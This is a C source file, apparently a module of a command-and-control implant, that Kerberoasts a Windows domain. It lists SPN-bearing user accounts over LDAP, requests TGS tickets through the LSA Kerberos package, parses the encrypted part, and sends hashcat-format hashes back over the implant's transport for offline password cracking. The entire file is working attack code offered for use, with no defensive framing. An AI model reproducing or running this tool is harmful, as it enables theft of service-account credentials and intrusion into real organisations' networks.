// cmd_kerberoast.c — Kerberoasting: enumerate SPN accounts via LDAP,
//                    request TGS tickets via LSA, output hashcat-compatible hashes.
//
// KV params: domain (UTF-8, optional — falls back to USERDNSDOMAIN env var)
//
// Output format:
//   RC4  (etype 23): $krb5tgs$23$*user*REALM*spn*<checksum_16b>$<data>
//   AES  (etype 17/18): $krb5tgs$<e>$*user*REALM*spn*<full_cipher>
//
// Requirements: domain-authenticated session (no special privileges needed).
// Tested on: Win10/Win11/Server2019+

#include "../core/beacon.h"

// NTSecAPI.h pulls shared/ntdef.h (kernel-mode) which conflicts with
// um/winnt.h already loaded via windows.h.  Declare the needed LSA/Kerberos
// types inline instead — secur32.lib is already in the link command.

// winternl.h (via beacon.h) defines NTSTATUS but not PNTSTATUS.
typedef NTSTATUS *PNTSTATUS;

typedef struct _LSA_STRING {
    USHORT  Length;
    USHORT  MaximumLength;
    PCHAR   Buffer;
} LSA_STRING, *PLSA_STRING;

// KerbRetrieveEncodedTicketMessage = 4 in KERB_PROTOCOL_MESSAGE_TYPE enum.
#define KerbRetrieveEncodedTicketMessage 4UL
#define KERB_RETRIEVE_TICKET_DONT_USE_CACHE 0x00000001UL

typedef struct _KERB_CRYPTO_KEY {
    LONG    KeyType;
    ULONG   Length;
    PUCHAR  Value;
} KERB_CRYPTO_KEY;

typedef struct _KERB_EXTERNAL_NAME {
    SHORT   NameType;
    USHORT  NameCount;
    UNICODE_STRING Names[1];
} KERB_EXTERNAL_NAME, *PKERB_EXTERNAL_NAME;

typedef struct _KERB_EXTERNAL_TICKET {
    PKERB_EXTERNAL_NAME ServiceName;
    PKERB_EXTERNAL_NAME TargetName;
    PKERB_EXTERNAL_NAME ClientName;
    UNICODE_STRING      DomainName;
    UNICODE_STRING      TargetDomainName;
    UNICODE_STRING      AltTargetDomainName;
    KERB_CRYPTO_KEY     SessionKey;
    ULONG               TicketFlags;
    ULONG               Flags;
    LARGE_INTEGER       KeyExpirationTime;
    LARGE_INTEGER       StartTime;
    LARGE_INTEGER       EndTime;
    LARGE_INTEGER       RenewUntil;
    LARGE_INTEGER       TimeSkew;
    ULONG               EncodedTicketSize;
    PUCHAR              EncodedTicket;
} KERB_EXTERNAL_TICKET, *PKERB_EXTERNAL_TICKET;

// SecHandle comes from security.h below.
#define SECURITY_WIN32
#include <security.h>

typedef struct _KERB_RETRIEVE_TKT_REQUEST {
    ULONG           MessageType;    // KERB_PROTOCOL_MESSAGE_TYPE
    LUID            LogonId;
    UNICODE_STRING  TargetName;
    ULONG           TicketFlags;
    ULONG           CacheOptions;
    LONG            EncryptionType;
    SecHandle       CredentialsHandle;
} KERB_RETRIEVE_TKT_REQUEST, *PKERB_RETRIEVE_TKT_REQUEST;

typedef struct _KERB_RETRIEVE_TKT_RESPONSE {
    KERB_EXTERNAL_TICKET Ticket;
} KERB_RETRIEVE_TKT_RESPONSE, *PKERB_RETRIEVE_TKT_RESPONSE;

// LSA function prototypes — exported from secur32.dll, already linked.
NTSTATUS NTAPI LsaConnectUntrusted(PHANDLE LsaHandle);
NTSTATUS NTAPI LsaLookupAuthenticationPackage(HANDLE LsaHandle, PLSA_STRING PackageName, PULONG AuthenticationPackage);
NTSTATUS NTAPI LsaCallAuthenticationPackage(HANDLE LsaHandle, ULONG AuthenticationPackage, PVOID ProtocolSubmitBuffer, ULONG SubmitBufferLength, PVOID *ProtocolReturnBuffer, PULONG ReturnBufferLength, PNTSTATUS ProtocolStatus);
NTSTATUS NTAPI LsaFreeReturnBuffer(PVOID Buffer);
NTSTATUS NTAPI LsaDeregisterLogonProcess(HANDLE LsaHandle);

#include <winldap.h>
#include <dsgetdc.h>
#include <lmcons.h>
#include <lmapibuf.h>

// ---- Helpers ----------------------------------------------------------------

static void kr_out(const char* s)   { out_write(s, (DWORD)rt_strlen(s)); }
static void kr_flush(void)          { out_flush_chunk(get_transport(), 0); }

static int kr_u8_to_wcs(const char* s, wchar_t* d, int cap) {
    return MultiByteToWideChar(CP_UTF8, 0, s, -1, d, cap);
}
static int kr_wcs_to_u8(const wchar_t* s, char* d, int cap) {
    return WideCharToMultiByte(CP_UTF8, 0, s, -1, d, cap, NULL, NULL);
}

static void kr_hex(const BYTE* src, DWORD n, char* dst) {
    static const char h[] = "0123456789abcdef";
    for (DWORD i = 0; i < n; ++i) {
        dst[i * 2]     = h[src[i] >> 4];
        dst[i * 2 + 1] = h[src[i] & 0xf];
    }
    dst[n * 2] = '\0';
}

static int kr_fmt_u32(char* b, DWORD v) {
    char t[12]; int n = 0;
    if (!v) { b[0] = '0'; b[1] = '\0'; return 1; }
    while (v) { t[n++] = (char)('0' + v % 10); v /= 10; }
    int i = 0; while (n) b[i++] = t[--n]; b[i] = '\0'; return i;
}

// ---- Minimal ASN.1 DER/BER parser -------------------------------------------
//
// asn1_tlv: читает один TLV-элемент из buf[bufLen] начиная с *pos.
// Возвращает 1 при успехе, записывает tag/content/clen.
// *pos продвигается за весь элемент (tag + length + content).

static int asn1_tlv(const BYTE* buf, DWORD bufLen, DWORD* pos,
                    BYTE* tag, const BYTE** content, DWORD* clen)
{
    if (*pos >= bufLen) return 0;
    *tag = buf[(*pos)++];
    if (*pos >= bufLen) return 0;
    BYTE lb = buf[(*pos)++];
    DWORD l;
    if (lb & 0x80) {
        int nb = lb & 0x7F;
        if (!nb || nb > 4 || *pos + (DWORD)nb > bufLen) return 0;
        l = 0;
        for (int i = 0; i < nb; ++i) l = (l << 8) | buf[(*pos)++];
    } else {
        l = lb;
    }
    if (*pos + l > bufLen) return 0;
    *content = buf + *pos;
    *clen    = l;
    *pos    += l;
    return 1;
}

// Пропустить один TLV-элемент.
static int asn1_skip(const BYTE* buf, DWORD bufLen, DWORD* pos) {
    BYTE t; const BYTE* c; DWORD l;
    return asn1_tlv(buf, bufLen, pos, &t, &c, &l);
}

// Войти в CONTEXT CONSTRUCTED [n] (тег 0xA0|n) и вернуть его содержимое.
// *pos продвигается за весь контекстный элемент.
static const BYTE* asn1_ctx(const BYTE* buf, DWORD bufLen, DWORD* pos,
                             BYTE n, DWORD* innerLen)
{
    if (*pos >= bufLen || buf[*pos] != (BYTE)(0xA0 | (n & 0x1F))) return NULL;
    BYTE t; const BYTE* c; DWORD l;
    if (!asn1_tlv(buf, bufLen, pos, &t, &c, &l)) return NULL;
    *innerLen = l;
    return c;
}

// ---- Разобрать Ticket (EncodedTicket из KERB_EXTERNAL_TICKET) ---------------
//
// Ticket [APPLICATION 1] IMPLICIT SEQUENCE {
//   [0] tkt-vno  INTEGER,
//   [1] realm    GeneralString,
//   [2] sname    PrincipalName,
//   [3] enc-part EncryptedData SEQUENCE {
//         [0] etype  INTEGER,
//         [1] kvno   INTEGER OPTIONAL,
//         [2] cipher OCTET STRING
//       }
// }
// APPLICATION 1 CONSTRUCTED = tag 0x61.
//
// Возвращает 1 при успехе и заполняет *etype/*cipher/*cipherLen.
static int ticket_parse(const BYTE* enc, DWORD encLen,
                        LONG* etype, const BYTE** cipher, DWORD* cipherLen)
{
    DWORD pos = 0;
    BYTE tag; const BYTE* c; DWORD l;

    // [APPLICATION 1] — тег 0x61
    if (!asn1_tlv(enc, encLen, &pos, &tag, &c, &l)) return 0;
    if (tag != 0x61) return 0;

    // RFC 4120 говорит IMPLICIT SEQUENCE, но Windows LSA (и MIT krb5)
    // кодирует EXPLICIT — внутри APPLICATION 1 лежит ещё обёртка SEQUENCE 0x30.
    // Если видим 0x30, входим в неё.
    if (l > 0 && c[0] == 0x30) {
        DWORD ip2 = 0; const BYTE* ic; DWORD il;
        if (!asn1_tlv(c, l, &ip2, &tag, &ic, &il)) return 0;
        c = ic; l = il;
    }

    // c[0..l-1] теперь содержит [0] tkt-vno, [1] realm, [2] sname, [3] enc-part
    DWORD p = 0;
    if (!asn1_skip(c, l, &p)) return 0;  // [0] tkt-vno
    if (!asn1_skip(c, l, &p)) return 0;  // [1] realm
    if (!asn1_skip(c, l, &p)) return 0;  // [2] sname

    // [3] enc-part
    DWORD ctx3Len;
    const BYTE* ctx3 = asn1_ctx(c, l, &p, 3, &ctx3Len);
    if (!ctx3) return 0;

    // Внутри [3] — EncryptedData SEQUENCE
    DWORD ep = 0;
    const BYTE* edSeq; DWORD edLen;
    if (!asn1_tlv(ctx3, ctx3Len, &ep, &tag, &edSeq, &edLen)) return 0;
    if (tag != 0x30) return 0;

    // [0] etype INTEGER
    DWORD ip = 0;
    DWORD etBufLen;
    const BYTE* etBuf = asn1_ctx(edSeq, edLen, &ip, 0, &etBufLen);
    if (!etBuf) return 0;
    DWORD tp = 0;
    const BYTE* iv; DWORD il;
    if (!asn1_tlv(etBuf, etBufLen, &tp, &tag, &iv, &il)) return 0;
    if (tag != 0x02 || !il || il > 4) return 0;
    LONG et = 0;
    for (DWORD i = 0; i < il; ++i) et = (et << 8) | iv[i];
    *etype = et;

    // Пропустить необязательный [1] kvno
    if (ip < edLen && edSeq[ip] == 0xA1) asn1_skip(edSeq, edLen, &ip);

    // [2] cipher OCTET STRING
    DWORD c2Len;
    const BYTE* c2 = asn1_ctx(edSeq, edLen, &ip, 2, &c2Len);
    if (!c2) return 0;
    DWORD cp = 0;
    const BYTE* cv; DWORD cl;
    if (!asn1_tlv(c2, c2Len, &cp, &tag, &cv, &cl)) return 0;
    if (tag != 0x04) return 0;

    *cipher     = cv;
    *cipherLen  = cl;
    return 1;
}

// ---- Вывод хеша в формате hashcat -------------------------------------------
static void output_hash(const char* user, const char* realm, const char* spn,
                         LONG etype, const BYTE* cipher, DWORD cLen)
{
    if (!cLen) return;

    // Выделяем буфер для hex всего cipher (2 hex на байт + \0).
    DWORD hexCap = cLen * 2 + 2;
    char* hexAll = (char*)bmalloc(hexCap);
    if (!hexAll) { kr_out("[!] kerberoast: out of memory\n"); return; }
    kr_hex(cipher, cLen, hexAll);

    char etStr[8];
    kr_fmt_u32(etStr, (DWORD)etype);

    if (etype == 23) {
        // RC4-HMAC: первые 16 байт — HMAC-MD5 checksum, остаток — шифртекст.
        // Hashcat mode 13100: $krb5tgs$23$*user*REALM*spn*<chk_hex>$<data_hex>
        if (cLen < 16) { bfree(hexAll); return; }
        char chk[33];
        kr_hex(cipher, 16, chk);
        // hexAll+32 — hex начиная с байта 16
        kr_out("$krb5tgs$23$*");
        kr_out(user);   kr_out("*");
        kr_out(realm);  kr_out("*");
        kr_out(spn);    kr_out("*");
        kr_out(chk);    kr_out("$");
        kr_out(hexAll + 32);
    } else {
        // AES-128 (17) / AES-256 (18) / other:
        // Hashcat mode 19600/19700: $krb5tgs$<e>$*user*REALM*spn*<full_cipher>
        kr_out("$krb5tgs$"); kr_out(etStr); kr_out("$*");
        kr_out(user);   kr_out("*");
        kr_out(realm);  kr_out("*");
        kr_out(spn);    kr_out("*");
        kr_out(hexAll);
    }
    kr_out("\n");
    kr_flush();
    bfree(hexAll);
}

// ---- Запросить TGS через LSA ------------------------------------------------
static void request_tgs(HANDLE hLsa, ULONG authPkg,
                         const char* user8, const char* realm8, const char* spn8)
{
    wchar_t wSpn[512] = {0};
    if (!kr_u8_to_wcs(spn8, wSpn, 512)) return;
    USHORT spnBytes = (USHORT)(rt_wstrlen(wSpn) * sizeof(WCHAR));

    // KERB_RETRIEVE_TKT_REQUEST с inline unicode-буфером для имени SPN.
    DWORD reqSize = (DWORD)sizeof(KERB_RETRIEVE_TKT_REQUEST) + spnBytes;
    BYTE* reqBuf  = (BYTE*)bmalloc(reqSize);
    if (!reqBuf) return;
    rt_memset(reqBuf, 0, reqSize);

    KERB_RETRIEVE_TKT_REQUEST* req = (KERB_RETRIEVE_TKT_REQUEST*)reqBuf;
    req->MessageType   = KerbRetrieveEncodedTicketMessage;
    // LogonId = {0,0} — текущая сессия
    req->CacheOptions  = KERB_RETRIEVE_TICKET_DONT_USE_CACHE; // всегда свежий TGS от KDC
    req->EncryptionType = 0; // negotiate (KDC выберет; обычно AES или RC4)
    rt_memset(&req->CredentialsHandle, 0, sizeof(SecHandle));

    PWCHAR nameBuf = (PWCHAR)(reqBuf + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    rt_memcpy(nameBuf, wSpn, spnBytes);
    req->TargetName.Length        = spnBytes;
    req->TargetName.MaximumLength = spnBytes;
    req->TargetName.Buffer        = nameBuf;

    KERB_RETRIEVE_TKT_RESPONSE* resp = NULL;
    ULONG respSize = 0;
    NTSTATUS protSt = 0;
    NTSTATUS st = LsaCallAuthenticationPackage(
                        hLsa, authPkg,
                        req, reqSize,
                        (PVOID*)&resp, &respSize, &protSt);
    bfree(reqBuf);

    if (st != 0 || protSt != 0 || !resp) {
        if (resp) LsaFreeReturnBuffer(resp);
        return;
    }

    KERB_EXTERNAL_TICKET* tkt = &resp->Ticket;
    if (tkt->EncodedTicket && tkt->EncodedTicketSize) {
        LONG etype = 0;
        const BYTE* cipher = NULL;
        DWORD cLen = 0;
        if (ticket_parse(tkt->EncodedTicket, tkt->EncodedTicketSize,
                         &etype, &cipher, &cLen)) {
            output_hash(user8, realm8, spn8, etype, cipher, cLen);
        } else {
            kr_out("[!] "); kr_out(spn8); kr_out(": ticket parse failed\n");
            kr_flush();
        }
    }
    LsaFreeReturnBuffer(resp);
}

// ---- Построить base DN: "corp.local" → "DC=corp,DC=local" ------------------
static void build_base_dn(const wchar_t* dom, wchar_t* out, int cap)
{
    int pos = 0, di = 0;
    while (dom[di] && pos < cap - 10) {
        if (pos > 0) out[pos++] = L',';
        out[pos++] = L'D'; out[pos++] = L'C'; out[pos++] = L'=';
        while (dom[di] && dom[di] != L'.' && pos < cap - 2) out[pos++] = dom[di++];
        if (dom[di] == L'.') ++di;
    }
    out[pos] = 0;
}

// ---- Точка входа ------------------------------------------------------------
void cmd_kerberoast(const BeaconTask* t)
{
    char domain8[256] = {0};
    kv_get_str(t->pay, t->pay_len, "domain", domain8, sizeof(domain8));

    wchar_t wDomain[256] = {0};
    if (!domain8[0]) {
        // Получить домен из окружения
        if (!GetEnvironmentVariableW(L"USERDNSDOMAIN", wDomain, 256) || !wDomain[0]) {
            kr_out("kerberoast: domain not specified and USERDNSDOMAIN not set\n");
            return;
        }
        kr_wcs_to_u8(wDomain, domain8, sizeof(domain8));
    } else {
        kr_u8_to_wcs(domain8, wDomain, 256);
    }

    // Найти DC
    PDOMAIN_CONTROLLER_INFOW dcInfo = NULL;
    DWORD dcErr = DsGetDcNameW(NULL, wDomain, NULL, NULL,
                                DS_DIRECTORY_SERVICE_REQUIRED | DS_RETURN_DNS_NAME,
                                &dcInfo);
    if (dcErr || !dcInfo) {
        char msg[80]; const char pfx[] = "kerberoast: DsGetDcName failed: ";
        rt_memcpy(msg, pfx, sizeof(pfx)-1); int ml = sizeof(pfx)-1;
        ml += kr_fmt_u32(msg+ml, dcErr ? dcErr : GetLastError());
        msg[ml++]='\n'; msg[ml]='\0'; kr_out(msg); return;
    }
    const wchar_t* dcHost = dcInfo->DomainControllerName;
    while (*dcHost == L'\\') ++dcHost;

    // LDAP: подключиться к DC
    LDAP* ld = ldap_initW((PWCHAR)dcHost, LDAP_PORT);
    if (!ld) {
        kr_out("kerberoast: ldap_init failed\n");
        NetApiBufferFree(dcInfo); return;
    }
    ULONG ver = LDAP_VERSION3;
    ldap_set_optionW(ld, LDAP_OPT_PROTOCOL_VERSION, &ver);
    if (ldap_bind_sW(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE) != LDAP_SUCCESS) {
        kr_out("kerberoast: ldap_bind failed\n");
        ldap_unbind(ld); NetApiBufferFree(dcInfo); return;
    }

    // Base DN
    wchar_t wBase[512] = {0};
    build_base_dn(wDomain, wBase, 512);

    // Запрос: user-объекты с servicePrincipalName, не отключённые, не компьютеры
    PWCHAR filter = (PWCHAR)(
        L"(&(objectClass=user)(servicePrincipalName=*)"
        L"(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
        L"(!(objectClass=computer)))");
    PWCHAR attrs[] = {
        (PWCHAR)L"sAMAccountName",
        (PWCHAR)L"servicePrincipalName",
        NULL
    };

    LDAPMessage* result = NULL;
    ULONG ldapSt = ldap_search_sW(ld, wBase, LDAP_SCOPE_SUBTREE,
                                   filter, attrs, 0, &result);
    if (ldapSt != LDAP_SUCCESS || !result) {
        char msg[64]; const char pfx[] = "kerberoast: ldap_search failed: ";
        rt_memcpy(msg, pfx, sizeof(pfx)-1); int ml = sizeof(pfx)-1;
        ml += kr_fmt_u32(msg+ml, ldapSt); msg[ml++]='\n'; msg[ml]='\0'; kr_out(msg);
        ldap_unbind(ld); NetApiBufferFree(dcInfo); return;
    }

    // Открыть LSA-соединение (без SeTcbPrivilege)
    HANDLE hLsa = NULL;
    if (LsaConnectUntrusted(&hLsa) != 0 || !hLsa) {
        kr_out("kerberoast: LsaConnectUntrusted failed\n");
        ldap_msgfree(result); ldap_unbind(ld); NetApiBufferFree(dcInfo); return;
    }
    // Найти пакет Kerberos
    const char kerbName[] = "Kerberos";
    LSA_STRING kerbPkg;
    kerbPkg.Buffer         = (char*)kerbName;
    kerbPkg.Length         = 8;
    kerbPkg.MaximumLength  = 9;
    ULONG authPkg = 0;
    if (LsaLookupAuthenticationPackage(hLsa, &kerbPkg, &authPkg) != 0) {
        kr_out("kerberoast: LsaLookupAuthenticationPackage failed\n");
        LsaDeregisterLogonProcess(hLsa);
        ldap_msgfree(result); ldap_unbind(ld); NetApiBufferFree(dcInfo); return;
    }

    // Realm в верхнем регистре для вывода
    char realm8[256] = {0};
    {
        wchar_t wRealm[256] = {0};
        for (int i = 0; wDomain[i] && i < 255; ++i)
            wRealm[i] = (wDomain[i] >= L'a' && wDomain[i] <= L'z')
                        ? (wchar_t)(wDomain[i] - 32) : wDomain[i];
        kr_wcs_to_u8(wRealm, realm8, sizeof(realm8));
    }

    // Итерация по найденным объектам
    int found = 0;
    for (LDAPMessage* entry = ldap_first_entry(ld, result);
         entry;
         entry = ldap_next_entry(ld, entry))
    {
        char user8[256] = {0};
        PWCHAR* samV = ldap_get_valuesW(ld, entry, (PWCHAR)L"sAMAccountName");
        if (samV && samV[0]) kr_wcs_to_u8(samV[0], user8, sizeof(user8));
        if (samV) ldap_value_freeW(samV);
        if (!user8[0]) continue;

        PWCHAR* spnV = ldap_get_valuesW(ld, entry, (PWCHAR)L"servicePrincipalName");
        if (!spnV) continue;

        // Запрашиваем только первый SPN: для одного аккаунта ключ один и тот же
        if (spnV[0]) {
            char spn8[512] = {0};
            kr_wcs_to_u8(spnV[0], spn8, sizeof(spn8));
            if (spn8[0]) {
                request_tgs(hLsa, authPkg, user8, realm8, spn8);
                ++found;
            }
        }
        ldap_value_freeW(spnV);
    }

    if (!found) {
        kr_out("kerberoast: no SPN user accounts found in domain ");
        kr_out(domain8); kr_out("\n");
    }

    LsaDeregisterLogonProcess(hLsa);
    ldap_msgfree(result);
    ldap_unbind(ld);
    NetApiBufferFree(dcInfo);
}
